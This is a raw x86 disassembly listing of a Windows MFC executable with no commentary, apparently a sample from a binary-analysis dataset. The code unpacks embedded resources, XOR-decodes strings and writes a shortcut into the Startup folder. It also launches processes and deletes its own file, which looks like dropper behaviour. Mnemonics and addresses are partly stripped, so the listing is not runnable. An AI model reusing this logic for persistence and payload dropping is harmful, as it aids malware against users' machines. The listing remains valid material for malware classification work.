sub_4010b0
push 0xffffffff
push sub_402eb1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x210
push ebx
push ebp
push esi
push edi
mov ebp ecx
call sub_401350
xor ebx ebx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x11d ]
mov [ esp + 0x11c ] bl
mov [ esp + 0x18 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x19 ]
push ebx
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x1c ]
push 0x7
push eax
push ebx
call [ SHGetSpecialFolderPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_402840
add esp 0x4
push 0x5c
lea ecx [ esp + 0x14 ]
mov [ esp + 0x22c ] ebx
call Ordinal_MFC42_5683
lea ecx [ esp + 0x14 ]
push eax
push ecx
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42_4129
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x22c ] 0x1
call Ordinal_MFC42_858
lea ecx [ esp + 0x14 ]
mov [ esp + 0x228 ] bl
call Ordinal_MFC42_800
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x11c ]
push edx
push rw-data
push eax
call [ sprintf@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
call sub_402840
add esp 0x10
mov eax [ eax ]
mov [ esp + 0x228 ] 0x2
lea edx [ esp + 0x18 ]
push rw-data
lea ecx [ esp + 0x120 ]
push edx
push ecx
push ebx
push eax
mov ecx ebp
call sub_401230
lea ecx [ esp + 0x14 ]
mov [ esp + 0x228 ] bl
call Ordinal_MFC42_800
mov ecx ebp
call sub_401590
lea ecx [ esp + 0x10 ]
mov [ esp + 0x228 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x220 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x21c
retn
sub_401230
sub esp 0x210
push 0x0
call [ CoInitialize@IAT ]
lea eax [ esp ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
mov eax [ esp ]
jge r-xdata
mov ecx [ esp + 0x214 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x50 ]
mov eax [ esp ]
mov ecx [ esp + 0x218 ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ esp ]
mov ecx [ esp + 0x224 ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ esp ]
mov ecx [ esp + 0x21c ]
push ecx
push eax
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ esp ]
lea ecx [ esp + 0x4 ]
push ecx
push r--data
mov edx [ eax ]
push eax
call [ edx ]
test eax eax
jge r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
call [ CoUninitialize@IAT ]
xor eax eax
add esp 0x210
retn 0x14
mov eax [ esp + 0x220 ]
push esi
lea edx [ esp + 0xc ]
push 0x104
push edx
push 0xffffffff
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push 0x1
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esp + 0x4 ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
call [ CoUninitialize@IAT ]
mov eax esi
pop esi
add esp 0x210
retn 0x14
mov eax [ esp + 0x4 ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esp ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
call [ CoUninitialize@IAT ]
xor eax eax
add esp 0x210
retn 0x14
sub_401350
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_402eec
push eax
mov eax 0x12874
mov [ fs : 0x0 ] esp
call sub_402c40
push ebp
push esi
lea eax [ esp + 0x8 ]
push edi
mov edi ecx
push eax
call sub_402680
add esp 0x4
push rw-data
push 0x81
push 0x0
mov [ esp + 0x12894 ] 0x0
call [ FindResourceA@IAT ]
mov esi eax
push esi
push 0x0
call [ SizeofResource@IAT ]
push esi
push 0x0
mov ebp eax
call [ LoadResource@IAT ]
mov esi eax
test esi esi
je r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x12888 ] 0xffffffff
call Ordinal_MFC42_800
xor eax eax
push esi
call [ LockResource@IAT ]
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_354
mov ecx [ esp + 0xc ]
push 0x0
push 0x1001
push ecx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x12894 ] 0x1
call Ordinal_MFC42_5186
test eax eax
jne r-xdata
push ebp
push esi
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_6385
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_1979
lea edx [ esp + 0x10 ]
push edx
call sub_402760
add esp 0x4
lea ecx [ esp + 0x24 ]
mov [ esp + 0x12888 ] 0x2
call sub_401950
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
lea ecx [ esp + 0x2c ]
mov [ esp + 0x12890 ] 0x3
call sub_4022d0
mov ecx edi
call sub_401740
lea ecx [ esp + 0x24 ]
mov [ esp + 0x12888 ] 0x2
call sub_401a00
lea ecx [ esp + 0x10 ]
mov [ esp + 0x12888 ] 0x1
call Ordinal_MFC42_800
lea ecx [ esp + 0x14 ]
mov [ esp + 0x12888 ] 0x0
call Ordinal_MFC42_665
lea ecx [ esp + 0xc ]
mov [ esp + 0x12888 ] 0xffffffff
call Ordinal_MFC42_800
mov eax 0x1
jmp r-xdata
lea ecx [ esp + 0x14 ]
mov [ esp + 0x12888 ] al
call Ordinal_MFC42_665
mov ecx [ esp + 0x12880 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x12880
retn
sub_4014d0
push 0xffffffff
push sub_402f27
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
xor esi esi
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x14 ] esi
call Ordinal_MFC42_537
mov edi [ esp + 0x2c ]
mov ebx 0x1
cmp edi esi
mov [ esp + 0x1c ] ebx
jle r-xdata
mov esi [ esp + 0x24 ]
lea edx [ esp + 0xc ]
push edx
mov ecx esi
call Ordinal_MFC42_535
mov [ esp + 0x10 ] ebx
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0x0
call Ordinal_MFC42_800
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
push ebp
mov ebp [ esp + 0x2c ]
mov al [ esi + ebp ]
push ebx
xor al 0xbf
lea ecx [ esp + 0x34 ]
push eax
call Ordinal_MFC42_536
lea ecx [ esp + 0x30 ]
mov [ esp + 0x20 ] 0x2
push ecx
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_939
lea ecx [ esp + 0x30 ]
mov [ esp + 0x20 ] bl
call Ordinal_MFC42_800
inc esi
cmp esi edi
jl r-xdata
pop ebp
sub_401590
sub esp 0x65c
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x269 ]
mov [ esp + 0x268 ] bl
mov [ esp + 0x168 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x169 ]
mov [ esp + 0x46c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x46d ]
mov [ esp + 0x36c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x36d ]
mov [ esp + 0x56c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x56d ]
push 0x104
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x26c ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea ecx [ esp + 0x56c ]
lea edx [ esp + 0x36c ]
push ecx
lea eax [ esp + 0x470 ]
push edx
lea ecx [ esp + 0x170 ]
push eax
lea edx [ esp + 0x274 ]
push ecx
push edx
call [ _splitpath@IAT ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x7d ]
mov [ esp + 0x7c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ esp + 0x17c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x7c ]
[ edi ]
not ecx
sub edi ecx
push 0x30
mov eax ecx
mov esi edi
mov edi edx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x2c ]
push ecx
call sub_4014d0
mov edi [ eax ]
or ecx 0xffffffff
xor eax eax
add esp 0x20
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x68 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_800
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x24 ]
lea edx [ esp + 0x24 ]
[ edi ]
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
push ecx
mov [ esp + 0x1c ] eax
push edx
push ebx
mov [ esp + 0x28 ] eax
push ebx
push ebx
mov [ esp + 0x34 ] eax
push ebx
push ebx
lea eax [ esp + 0x84 ]
push ebx
push eax
push ebx
mov [ esp + 0x78 ] 0x1
mov [ esp + 0x7c ] bx
call [ CreateProcessA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x65c
retn
sub_401740
push 0xffffffff
push sub_402f60
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x6c
push ebx
push esi
push edi
push rw-data
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_537
xor ebx ebx
push 0xff
push 0x100
lea ecx [ esp + 0x14 ]
mov [ esp + 0x88 ] ebx
call Ordinal_MFC42_2919
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
push 0x5c
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_5683
push eax
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_4129
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0x84 ] 0x1
call Ordinal_MFC42_858
lea ecx [ esp + 0x10 ]
mov [ esp + 0x80 ] bl
call Ordinal_MFC42_800
push 0xf
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_4014d0
add esp 0xc
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0x84 ] 0x2
call Ordinal_MFC42_939
lea ecx [ esp + 0x10 ]
mov [ esp + 0x80 ] bl
call Ordinal_MFC42_800
push rw-data
push 0x84
push ebx
call [ FindResourceA@IAT ]
mov esi eax
push esi
push ebx
call [ SizeofResource@IAT ]
push esi
push ebx
mov edi eax
call [ LoadResource@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0xbb8
call [ Sleep@IAT ]
mov eax [ esp + 0xc ]
push eax
call [ DeleteFileA@IAT ]
push esi
call [ LockResource@IAT ]
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_354
mov edx [ esp + 0xc ]
push ebx
push 0x1001
push edx
lea ecx [ esp + 0x20 ]
mov [ esp + 0x8c ] 0x3
call Ordinal_MFC42_5186
test eax eax
jne r-xdata
push edi
push esi
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_6385
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_1979
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x34 ]
lea edx [ esp + 0x34 ]
[ edi ]
lea ecx [ esp + 0x24 ]
mov [ esp + 0x24 ] eax
push ecx
push edx
push ebx
push ebx
push ebx
mov [ esp + 0x3c ] eax
push ebx
push ebx
mov [ esp + 0x48 ] eax
push ebx
push ebx
lea ecx [ esp + 0x30 ]
mov [ esp + 0x54 ] eax
mov [ esp + 0x84 ] 0x1
mov [ esp + 0x88 ] bx
call Ordinal_MFC42_2915
push eax
push ebx
call [ CreateProcessA@IAT ]
test eax eax
mov [ esp + 0x80 ] bl
lea ecx [ esp + 0x14 ]
jne r-xdata
lea ecx [ esp + 0x14 ]
mov [ esp + 0x80 ] bl
call Ordinal_MFC42_665
jmp r-xdata
call Ordinal_MFC42_665
call Ordinal_MFC42_665
jmp r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x80 ] 0xffffffff
call Ordinal_MFC42_800
mov ecx [ esp + 0x78 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x78
retn
sub_401950
push ecx
mov eax ecx
mov cl [ esp + 0x3 ]
mov [ eax + 0x1282c ] cl
xor ecx ecx
mov [ eax + 0x12830 ] ecx
mov [ eax + 0x12834 ] ecx
mov [ eax + 0x12838 ] ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0xd468 ] ecx
mov [ eax + 0xd46c ] 0x20000
mov [ eax + 0xd470 ] ecx
mov [ eax + 0xd474 ] ecx
mov [ eax + 0x12828 ] cl
mov [ eax + 0x12840 ] ecx
mov [ eax + 0x12844 ] ecx
mov [ eax + 0x12848 ] ecx
mov [ eax + 0x1283c ] ecx
mov [ eax + 0x1284c ] ecx
mov [ eax + 0x12850 ] 0x80
mov [ eax + 0x12854 ] ecx
mov [ eax + 0x12858 ] ecx
pop ecx
retn
sub_401a00
push 0xffffffff
push sub_402f7e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
xor edi edi
mov [ esp + 0x14 ] edi
call sub_402340
mov eax [ esi + 0x12830 ]
push eax
mov [ esp + 0xc ] eax
call Ordinal_MFC42_825
mov ecx [ esp + 0x10 ]
add esp 0x4
mov [ esi + 0x12830 ] edi
mov [ esi + 0x12834 ] edi
mov [ esi + 0x12838 ] edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401aa0
push esi
mov esi ecx
mov eax [ esi + 0x12858 ]
shr eax 0x1
mov [ esi + 0x12858 ] eax
jne r-xdata
mov eax [ esi + 0x12854 ]
mov ecx [ esi + 0x12858 ]
and eax ecx
pop esi
neg eax
sbb eax eax
neg eax
retn
mov al [ esi + 0x12828 ]
test al al
jne r-xdata
mov eax [ esi + 0x12848 ]
mov ecx [ esi + 0x12840 ]
xor edx edx
mov dl [ ecx + eax ]
inc eax
mov [ esi + 0x12854 ] edx
mov [ esi + 0x12848 ] eax
mov eax [ esi + 0x4 ]
push eax
call [ getc@IAT ]
add esp 0x4
mov [ esi + 0x12854 ] eax
jmp r-xdata
mov [ esi + 0x12858 ] 0x80
sub_401b10
push ebx
push esi
xor esi esi
mov edx 0x13a
mov [ ecx + 0xe820 ] esi
lea eax [ ecx + 0xde48 ]
mov [ eax - 0x4ec ] edx
dec edx
mov [ eax ] edx
mov [ eax + 0x4ec ] 0x1
mov ebx [ eax + 0x9d8 ]
sub eax 0x4
inc ebx
cmp edx 0x1
mov [ eax + 0x9d8 ] ebx
jge r-xdata
mov [ ecx + 0xde4c ] esi
mov [ ecx + 0x12824 ] esi
mov esi 0x1000
add ecx 0x12820
mov eax 0x2710
lea ebx [ esi + 0xc8 ]
cdq
idiv ebx
mov edx [ ecx + 0x4 ]
sub ecx 0x4
add eax edx
dec esi
mov [ ecx + 0x4 ] eax
cmp esi 0x1
jge r-xdata
pop esi
pop ebx
retn
sub_401b90
mov eax [ ecx + 0xe338 ]
push ebx
push esi
cmp eax 0x7fff
push edi
jb r-xdata
mov edx [ esp + 0x10 ]
mov eax edx
mov edi [ ecx + edx * 4 + 0xde4c ]
mov ebx [ ecx + edx * 4 + 0xde48 ]
lea esi [ ecx + edx * 4 + 0xde48 ]
cmp edi ebx
jne r-xdata
xor esi esi
lea edx [ ecx + 0xe334 ]
mov edi 0x13a
mov esi [ ecx + eax * 4 + 0xde4c ]
inc esi
mov [ ecx + eax * 4 + 0xde4c ] esi
dec eax
js r-xdata
mov edi [ esi ]
mov ebx [ esi - 0x4 ]
sub esi 0x4
dec eax
cmp edi ebx
je r-xdata
mov [ edx + 0x4ec ] esi
mov eax [ edx ]
inc eax
sub edx 0x4
shr eax 0x1
mov [ edx + 0x4 ] eax
add esi eax
dec edi
jne r-xdata
mov [ ecx + 0xe338 ] esi
pop edi
pop esi
pop ebx
retn 0x4
lea ecx [ ecx + eax * 4 + 0xe338 ]
inc eax
cmp eax edx
jge r-xdata
mov edi [ ecx ]
sub ecx 0x4
inc edi
dec eax
mov [ ecx + 0x4 ] edi
jne r-xdata
mov edi [ ecx + edx * 4 + 0xd960 ]
mov esi [ ecx + eax * 4 + 0xd960 ]
mov [ ecx + eax * 4 + 0xd960 ] edi
mov [ ecx + edx * 4 + 0xd960 ] esi
mov [ ecx + esi * 4 + 0xd478 ] edx
mov [ ecx + edi * 4 + 0xd478 ] eax
sub_401c50
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov esi 0x1
mov edi 0x13a
mov edi eax
lea esi [ eax + 0x1 ]
jmp r-xdata
lea eax [ edi + esi ]
cdq
sub eax edx
sar eax 0x1
cmp [ ecx + eax * 4 + 0xe338 ] ebx
jbe r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
cmp esi edi
jl r-xdata
sub_401c90
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov esi 0x1
mov edi 0x1000
mov edi eax
lea esi [ eax + 0x1 ]
jmp r-xdata
lea eax [ edi + esi ]
cdq
sub eax edx
sar eax 0x1
cmp [ ecx + eax * 4 + 0xe824 ] ebx
jbe r-xdata
lea eax [ esi - 0x1 ]
pop edi
pop esi
pop ebx
retn 0x4
cmp esi edi
jl r-xdata
sub_401cd0
push esi
push edi
mov esi ecx
mov edi 0x11
mov ecx esi
call sub_401aa0
mov ecx [ esi + 0xd470 ]
dec edi
lea edx [ eax + ecx * 2 ]
mov [ esi + 0xd470 ] edx
jne r-xdata
pop edi
pop esi
retn
sub_401d00
push ebx
push ebp
push esi
mov esi ecx
push edi
xor edx edx
mov ecx [ esi + 0xd468 ]
mov eax [ esi + 0xd470 ]
mov edi [ esi + 0xd46c ]
sub eax ecx
sub edi ecx
inc eax
imul eax [ esi + 0xe338 ]
dec eax
mov ecx esi
div edi
push eax
call sub_401c50
mov ebp eax
mov ecx [ esi + 0xe338 ]
xor edx edx
mov ebx [ esi + 0xd468 ]
mov eax [ esi + ebp * 4 + 0xe334 ]
imul eax edi
div ecx
xor edx edx
add eax ebx
mov [ esi + 0xd46c ] eax
mov eax [ esi + ebp * 4 + 0xe338 ]
imul eax edi
div ecx
mov edi 0xffff0000
add eax ebx
mov ebx 0xffff8000
mov [ esi + 0xd468 ] eax
cmp eax 0x8000
jb r-xdata
mov ecx [ esi + 0xd470 ]
add eax 0xffff0000
mov [ esi + 0xd468 ] eax
mov eax [ esi + 0xd46c ]
add ecx edi
add eax edi
mov [ esi + 0xd470 ] ecx
mov [ esi + 0xd46c ] eax
jmp r-xdata
cmp [ esi + 0xd46c ] 0x10000
ja r-xdata
mov ecx [ esi + 0xd46c ]
cmp ecx 0x18000
ja r-xdata
mov ecx [ esi + 0xd46c ]
mov eax [ esi + 0xd468 ]
shl ecx 0x1
shl eax 0x1
mov [ esi + 0xd46c ] ecx
mov ecx esi
mov [ esi + 0xd468 ] eax
call sub_401aa0
mov edx [ esi + 0xd470 ]
lea eax [ eax + edx * 2 ]
mov [ esi + 0xd470 ] eax
jmp r-xdata
mov edi [ esi + ebp * 4 + 0xd960 ]
push ebp
mov ecx esi
call sub_401b90
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0xd470 ]
add eax 0xffff8000
add edx ebx
add ecx 0xffff8000
mov [ esi + 0xd470 ] edx
mov [ esi + 0xd468 ] eax
mov [ esi + 0xd46c ] ecx
jmp r-xdata
mov eax [ esi + 0xd468 ]
cmp eax 0x10000
jb r-xdata
sub_401e40
push ebx
push ebp
push esi
mov esi ecx
push edi
xor edx edx
mov ecx [ esi + 0xd468 ]
mov eax [ esi + 0xd470 ]
mov edi [ esi + 0xd46c ]
sub eax ecx
sub edi ecx
inc eax
imul eax [ esi + 0xe824 ]
dec eax
mov ecx esi
div edi
push eax
call sub_401c90
mov ebp eax
mov ecx [ esi + 0xe824 ]
xor edx edx
mov ebx [ esi + 0xd468 ]
mov eax [ esi + ebp * 4 + 0xe824 ]
imul eax edi
div ecx
xor edx edx
add eax ebx
mov [ esi + 0xd46c ] eax
mov eax [ esi + ebp * 4 + 0xe828 ]
imul eax edi
div ecx
mov edi 0xffff0000
add eax ebx
mov ebx 0xffff8000
mov [ esi + 0xd468 ] eax
cmp eax 0x8000
jb r-xdata
mov ecx [ esi + 0xd470 ]
add eax 0xffff0000
mov [ esi + 0xd468 ] eax
mov eax [ esi + 0xd46c ]
add ecx edi
add eax edi
mov [ esi + 0xd470 ] ecx
mov [ esi + 0xd46c ] eax
jmp r-xdata
cmp [ esi + 0xd46c ] 0x10000
ja r-xdata
mov ecx [ esi + 0xd46c ]
cmp ecx 0x18000
ja r-xdata
mov ecx [ esi + 0xd46c ]
mov eax [ esi + 0xd468 ]
shl ecx 0x1
shl eax 0x1
mov [ esi + 0xd46c ] ecx
mov ecx esi
mov [ esi + 0xd468 ] eax
call sub_401aa0
mov edx [ esi + 0xd470 ]
lea eax [ eax + edx * 2 ]
mov [ esi + 0xd470 ] eax
jmp r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0xd470 ]
add eax 0xffff8000
add edx ebx
add ecx 0xffff8000
mov [ esi + 0xd470 ] edx
mov [ esi + 0xd468 ] eax
mov [ esi + 0xd46c ] ecx
jmp r-xdata
mov eax [ esi + 0xd468 ]
cmp eax 0x10000
jb r-xdata
sub_401f80
sub esp 0x2c
push ebp
mov ebp ecx
mov [ esp + 0x20 ] ebp
mov al [ ebp + 0x12828 ]
test al al
jne r-xdata
cmp [ ebp + 0x12844 ] 0x4
jae r-xdata
mov ecx [ ebp + 0x4 ]
lea eax [ ebp + 0xc ]
push ecx
push 0x1
push 0x4
push eax
call [ fread@IAT ]
add esp 0x10
cmp eax 0x1
jae r-xdata
mov eax [ ebp + 0x12848 ]
mov edx [ ebp + 0x12840 ]
mov ecx [ edx + eax ]
add eax 0x4
mov [ ebp + 0xc ] ecx
mov [ ebp + 0x1283c ] ecx
mov [ ebp + 0x12848 ] eax
push rw-data
mov ecx ebp
call sub_401a70
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push rw-data
mov ecx ebp
call sub_401a70
pop ebp
add esp 0x2c
retn
push esi
push edi
mov ecx ebp
call sub_401cd0
mov ecx ebp
call sub_401b10
lea edi [ ebp + 0x18 ]
mov ecx 0x3f1
mov eax 0x20202020
mov esi 0xfc4
[ edi ]
mov eax [ ebp + 0xc ]
xor edi edi
test eax eax
mov [ esp + 0x10 ] esi
jbe r-xdata
push edi
push rw-data
call [ printf@IAT ]
add esp 0x8
pop edi
pop esi
push ebx
jmp r-xdata
mov ecx ebp
call sub_401d00
mov ebx eax
cmp ebx 0x100
jge r-xdata
mov ecx ebp
call sub_401e40
mov ecx eax
mov eax esi
sub eax ecx
add ebx 0xffffff03
dec eax
xor ecx ecx
and eax 0xfff
mov [ esp + 0x30 ] ebx
test ebx ebx
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] ecx
jle r-xdata
mov al [ ebp + 0x12828 ]
test al al
jne r-xdata
cmp edi [ ebp + 0x14 ]
jbe r-xdata
add edi ebx
mov [ esp + 0x34 ] edi
jmp r-xdata
mov eax [ ebp + 0x12834 ]
lea ecx [ ebp + 0x1282c ]
lea edx [ esp + 0x13 ]
mov [ esp + 0x13 ] bl
push edx
push 0x1
push eax
call sub_402430
mov eax [ ebp + 0x8 ]
push eax
push ebx
call [ putc@IAT ]
add esp 0x8
jmp r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
push edi
push rw-data
call [ printf@IAT ]
mov eax [ ebp + 0x14 ]
add esp 0x8
add eax 0x400
mov [ ebp + 0x14 ] eax
add ecx eax
mov al [ ebp + 0x12828 ]
and ecx 0xfff
xor ebx ebx
test al al
mov bl [ ecx + ebp + 0x18 ]
mov [ esp + 0x28 ] ebx
jne r-xdata
mov [ esi + ebp + 0x18 ] bl
inc esi
and esi 0xfff
inc edi
mov [ esp + 0x14 ] esi
jmp r-xdata
mov esi [ esp + 0x14 ]
pop ebx
mov eax [ ebp + 0x12834 ]
mov ecx [ ebp + 0x12838 ]
lea edi [ ebp + 0x1282c ]
sub ecx eax
cmp ecx 0x1
mov [ esp + 0x13 ] bl
mov esi eax
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
push ebx
call [ putc@IAT ]
add esp 0x8
jmp r-xdata
mov ecx eax
sub ecx esi
cmp ecx 0x1
jae r-xdata
mov edx [ edi + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov [ eax + ebp + 0x18 ] bl
inc eax
and eax 0xfff
inc ecx
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x30 ]
cmp ecx eax
mov [ esp + 0x18 ] ecx
jl r-xdata
lea ecx [ eax - 0x1 ]
push eax
push eax
mov [ esp + 0x40 ] ecx
push ecx
mov ecx edi
call sub_402600
mov ecx [ edi + 0x8 ]
lea eax [ ecx - 0x1 ]
cmp esi eax
je r-xdata
lea edx [ esi + 0x1 ]
mov ecx edi
push edx
push eax
push esi
call sub_402600
mov eax [ edi + 0x8 ]
mov edx esi
sub edx eax
lea ecx [ esp + 0x13 ]
inc edx
push ecx
push edx
push eax
mov ecx edi
call sub_402630
mov eax [ edi + 0x8 ]
cmp esi eax
je r-xdata
mov ecx 0x1
mov ecx eax
sub ecx edx
cmp ecx 0x1
ja r-xdata
mov eax [ esp + 0x1c ]
mov edi [ esp + 0x34 ]
lea eax [ esi + 0x1 ]
cmp esi eax
je r-xdata
mov dl [ eax - 0x1 ]
dec eax
dec ecx
cmp eax esi
mov [ ecx ] dl
jne r-xdata
inc [ edi + 0x8 ]
mov cl [ esp + 0x13 ]
mov [ esi ] cl
inc esi
cmp esi eax
jne r-xdata
sub eax edx
xor eax eax
jmp r-xdata
test edx edx
jne r-xdata
mov cl [ esp + 0x13 ]
mov [ esi ] cl
inc esi
cmp esi eax
jne r-xdata
jmp r-xdata
push eax
call Ordinal_MFC42_823
mov ebp [ edi + 0x4 ]
add esp 0x4
cmp ebp esi
mov [ esp + 0x20 ] eax
mov ebx eax
je r-xdata
xor eax eax
add eax ecx
test eax eax
mov [ esp + 0x24 ] eax
jge r-xdata
lea edx [ esp + 0x13 ]
push edx
push ebx
call sub_402660
mov ebp [ edi + 0x8 ]
add esp 0x8
cmp esi ebp
je r-xdata
push ebp
push ebx
call sub_402660
add esp 0x8
inc ebx
inc ebp
cmp ebp esi
jne r-xdata
mov eax [ edi + 0x4 ]
push eax
mov [ esp + 0x3c ] eax
call Ordinal_MFC42_825
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
add esp 0x4
lea edx [ eax + ecx ]
mov ecx [ edi + 0x4 ]
test ecx ecx
mov [ edi + 0xc ] edx
jne r-xdata
inc ebx
mov edx [ edi + 0x8 ]
sub edx ecx
xor edx edx
jmp r-xdata
push esi
push ebx
call sub_402660
add esp 0x8
inc esi
inc ebx
cmp esi ebp
jne r-xdata
mov ebx [ esp + 0x28 ]
mov ebp [ esp + 0x2c ]
lea ecx [ edx + eax + 0x1 ]
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ecx
jmp r-xdata
sub_4022d0
mov eax [ esp + 0x4 ]
push esi
push edi
mov edi [ fopen@IAT ]
mov esi ecx
push rw-data
push eax
mov [ esi + 0x12828 ] 0x0
call edi
mov ecx [ esp + 0x18 ]
push rw-data
push ecx
mov [ esi + 0x4 ] eax
call edi
mov ecx [ esi + 0x4 ]
add esp 0x10
test ecx ecx
mov [ esi + 0x8 ] eax
je r-xdata
pop edi
pop esi
retn 0x8
test eax eax
je r-xdata
mov ecx esi
call sub_401f80
mov edx [ esi + 0x4 ]
mov edi [ fclose@IAT ]
push edx
call edi
mov eax [ esi + 0x8 ]
push eax
call edi
add esp 0x8
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
sub_402340
push ecx
mov edx [ ecx + 0x12830 ]
xor eax eax
cmp edx eax
push esi
je r-xdata
pop esi
pop ecx
retn
mov esi [ ecx + 0x12834 ]
sub esi edx
je r-xdata
push ebp
push edi
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
